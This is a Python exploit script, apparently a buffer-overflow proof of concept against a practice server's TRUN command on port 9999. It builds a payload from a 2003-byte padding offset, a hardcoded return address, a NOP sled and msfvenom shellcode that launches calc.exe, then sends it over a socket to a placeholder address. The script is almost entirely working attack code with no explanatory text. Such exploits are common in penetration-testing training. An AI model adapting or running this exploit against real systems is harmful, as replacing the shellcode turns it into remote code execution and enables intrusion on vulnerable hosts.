import socket
import sys

#msfvenom -p windows/exec CMD=calc.exe EXITFUNC=thread -f c -b '\x00'

payload = ("\xd9\xcd\xba\xe0\x67\xee\xc9\xd9\x74\x24\xf4\x5f\x31\xc9\xb1"
"\x31\x83\xc7\x04\x31\x57\x14\x03\x57\xf4\x85\x1b\x35\x1c\xcb"
"\xe4\xc6\xdc\xac\x6d\x23\xed\xec\x0a\x27\x5d\xdd\x59\x65\x51"
"\x96\x0c\x9e\xe2\xda\x98\x91\x43\x50\xff\x9c\x54\xc9\xc3\xbf"
"\xd6\x10\x10\x60\xe7\xda\x65\x61\x20\x06\x87\x33\xf9\x4c\x3a"
"\xa4\x8e\x19\x87\x4f\xdc\x8c\x8f\xac\x94\xaf\xbe\x62\xaf\xe9"
"\x60\x84\x7c\x82\x28\x9e\x61\xaf\xe3\x15\x51\x5b\xf2\xff\xa8"
"\xa4\x59\x3e\x05\x57\xa3\x06\xa1\x88\xd6\x7e\xd2\x35\xe1\x44"
"\xa9\xe1\x64\x5f\x09\x61\xde\xbb\xa8\xa6\xb9\x48\xa6\x03\xcd"
"\x17\xaa\x92\x02\x2c\xd6\x1f\xa5\xe3\x5f\x5b\x82\x27\x04\x3f"
"\xab\x7e\xe0\xee\xd4\x61\x4b\x4e\x71\xe9\x61\x9b\x08\xb0\xef"
"\x5a\x9e\xce\x5d\x5c\xa0\xd0\xf1\x35\x91\x5b\x9e\x42\x2e\x8e"
"\xdb\xad\xcc\x1b\x11\x46\x49\xce\x98\x0b\x6a\x24\xde\x35\xe9"
"\xcd\x9e\xc1\xf1\xa7\x9b\x8e\xb5\x54\xd1\x9f\x53\x5b\x46\x9f"
"\x71\x38\x09\x33\x19\x91\xac\xb3\xb8\xed")

return_address = "\xaf\x11\x50\x62"

offset = 2003
payload = "A" * offset + return_address + "\x90" * 32 + payload 
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('iphere', 9999))
        s.send(('TRUN /.:/' + payload))
        s.close()
        print("[+] Payload sent!")
except:
        sys.exit()
		
